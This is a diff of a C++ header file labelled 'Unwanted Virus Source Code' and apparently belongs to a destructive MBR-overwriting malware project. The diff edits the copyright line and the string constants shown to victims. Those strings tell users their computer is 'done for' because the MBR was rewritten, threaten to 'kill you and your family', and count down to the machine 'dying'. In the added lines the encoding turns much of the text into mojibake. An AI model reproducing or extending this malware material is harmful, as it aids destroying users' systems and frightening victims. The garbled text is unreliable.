@@ -4,7 +4,7 @@
 |   Unwanted Virus Source Code               |
 |   data program "data.h"                    |
 |                                            |
-|   (C) BenjaminFretez 2021-2023             |
+|   Copyright (c) 2021 BenjaminFretez        |
 |                                            |
 +--------------------------------------------*/
 
@@ -25,16 +25,16 @@ using namespace std;
 DWORD wb;
 
 /* files content */
-const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour ETA is 2 minutes, THE TIME IS RUNNING! =)";
+const unsigned char msg[] = "Hello! You have ran the called ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½d ï¿½ï¿½ï¿½ï¿½ï¿½ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour ETA is 2 minutes, THE TIME IS RUNNING! =)";
 const size_t msg_len = sizeof(msg);
 
-const unsigned char unfm[] = "you have found a way for end me, but I will come back and kill you\r\nand your family see me next time when... ** cough cough ** when€²ðís¡xw²¤¤\r\nð'¬¼€» ** dies ** \n...\r\n";
+const unsigned char unfm[] = "you have found a way for end me, but I will come back and kill you\r\nand your family see me next time when... ** cough cough ** whenï¿½ï¿½ï¿½ï¿½sï¿½xwï¿½ï¿½ï¿½\r\nï¿½'ï¿½ï¿½ï¿½ï¿½ ** dies ** \n...\r\n";
 const size_t unfm_len = sizeof(unfm);
 
-const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\ntwíþþe®@Enderµañ©h@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Íthesdjdefe¾»¬»«¥®²³ÞÄ³®";
+const unsigned char diem[] = "ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½É²ï¿½2ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½   ï¿½ï¿½ï¿½ ï¿½ï¿½Eï¿½ Tï¿½ ï¿½ï¿½ï¿½ YOU NEED TO DIEï¿½ï¿½ï¿½ aï¿½aï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\r\ntwï¿½ï¿½ï¿½eï¿½@Enderï¿½aï¿½h@#RT#$tï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½sï¿½ï¿½ï¿½ F3ï¿½ï¿½Þ³TÅ®ï¿½ï¿½Þ€ï¿½ï¿½ï¿½Wï¿½ï¿½É€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ï¿½ï¿½É³ï¿½ï¿½ï¿½ï¿½ï¿½Aï¿½ï¿½É®Ü¼Ú¼ï¿½ï¿½thesdjdefeï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä³ï¿½";
 const size_t die_len = sizeof(diem);
 
-const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
+const unsigned char lastm[] = "ï¿½ï¿½ï¿½\n YOU COMPUTER WILL DIE IN 10 SECONDS ï¿½ï¿½ï¿½ï¿½Å³ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\r\nï¿½ï¿½ï¿½Ü¤Wï¿½ nï¿½ï¿½ï¿½ ï¿½ ï¿½ï¿½wc ï¿½mputyer guysï¿½ï¿½ï¿½ï¿½6YEï¿½\r\nï¿½ï¿½ï¿½Þ¤ï¿½Ü¼Ú€Time is over, you killed it!ï¿½Þ¤ï¿½Þ¤\r\nï¿½ï¿½å²€Þ¤";
 const size_t last_len = sizeof(lastm);
 
 const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
